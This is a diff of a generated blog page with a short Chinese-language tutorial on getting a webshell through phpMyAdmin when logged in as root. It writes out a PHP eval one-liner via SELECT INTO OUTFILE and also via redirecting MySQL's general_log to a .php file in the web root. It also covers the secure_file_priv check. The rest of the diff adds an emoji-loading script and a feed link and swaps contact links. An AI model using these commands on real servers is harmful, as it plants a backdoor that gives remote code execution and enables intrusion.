@@ -27,6 +27,7 @@ Phpmyadmin getshell一般情况下，有两种操作方式：1、sql语句into o
     
     <script src="/libs/jquery/jquery.min.js"></script>
     
+<link rel="alternate" href="/atom.xml" title="Evergreen" type="application/atom+xml">
 </head>
 
 
@@ -456,7 +457,7 @@ Phpmyadmin getshell一般情况下，有两种操作方式：1、sql语句into o
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="phpmyadmin，getshell的方法"><a href="#phpmyadmin，getshell的方法" class="headerlink" title="phpmyadmin，getshell的方法"></a>phpmyadmin，getshell的方法</h2><p>getshell前提：phpmyadmin以root权限登陆。</p>
-<h3 id="Phpmyadmin-getshell一般情况下，有两种操作方式："><a href="#Phpmyadmin-getshell一般情况下，有两种操作方式：" class="headerlink" title="Phpmyadmin getshell一般情况下，有两种操作方式："></a>Phpmyadmin getshell一般情况下，有两种操作方式：</h3><h4 id="1、sql语句into-outfile写入getshell（前提：需要知道网站根目录）"><a href="#1、sql语句into-outfile写入getshell（前提：需要知道网站根目录）" class="headerlink" title="1、sql语句into outfile写入getshell（前提：需要知道网站根目录）"></a>1、sql语句into outfile写入getshell（前提：需要知道网站根目录）</h4><p>​      执行 Select “<?php @eval($_POST['pass'])?>“ into outfile         “C:/phpStudy/PHPTutorial/WWW/a.php”; </p>
+<h3 id="Phpmyadmin-getshell一般情况下，有两种操作方式："><a href="#Phpmyadmin-getshell一般情况下，有两种操作方式：" class="headerlink" title="Phpmyadmin getshell一般情况下，有两种操作方式："></a>Phpmyadmin getshell一般情况下，有两种操作方式：</h3><h4 id="1、sql语句into-outfile写入getshell（前提：需要知道网站根目录）"><a href="#1、sql语句into-outfile写入getshell（前提：需要知道网站根目录）" class="headerlink" title="1、sql语句into outfile写入getshell（前提：需要知道网站根目录）"></a>1、sql语句into outfile写入getshell（前提：需要知道网站根目录）</h4><p>​      执行 Select “<!--?php @eval($_POST['pass'])?-->“ into outfile         “C:/phpStudy/PHPTutorial/WWW/a.php”; </p>
 <p>会出现 // #1290 -The MYSQL server is running with the –secure-file-priv  option so it cannot execute this statement 错误，原因是mysql正在使用–secure-file-priv选项运行，所以它无法执行这条sql语句。</p>
 <p>  Show global variables like “%secure_file_priv%”    //查看secure_file_priv文件的配置情况 </p>
 <p> Secure_file_priv为NULL时，mysql不允许导入导出</p>
@@ -471,12 +472,30 @@ Phpmyadmin getshell一般情况下，有两种操作方式：1、sql语句into o
 <p>Set   global general_log=’on’;            //开启general log日志。</p>
 <p>Set  global general_log_file=’C:/phpStudy/PHPTutorial/WWW/500.php’;       //设置日志文件保存路径。</p>
 <p>执行任意的sql语句，就能把内容存储到.php文件中。</p>
-<p>​    select  “<?php @eval ($_POST[' pass'] ?>“;      //一句话写入日志文件。</p>
+<p>​    select  “<!--?php @eval ($_POST[' pass'] ?-->“;      //一句话写入日志文件。</p>
 <p>​    set global general_log=’off’;       //关闭general_log日志 </p>
 <p>​    </p>
 <h5 id="phpmyadmin，getshell的核心："><a href="#phpmyadmin，getshell的核心：" class="headerlink" title="phpmyadmin，getshell的核心："></a>phpmyadmin，getshell的核心：</h5><p>​                         1、找到网站的绝对路径</p>
 <p>​                         2、执行sql语句。</p>
-
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
             </div>
             <hr/>
 
@@ -946,13 +965,13 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             
         </div>
         <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+    <a href="https://feather-arch.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
         <i class="fab fa-github"></i>
     </a>
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:unreal_plume@163.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
     </a>
 
@@ -962,7 +981,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
 
 
 
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3291414878" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3291414878" data-position="top" data-delay="50">
         <i class="fab fa-qq"></i>
     </a>
 
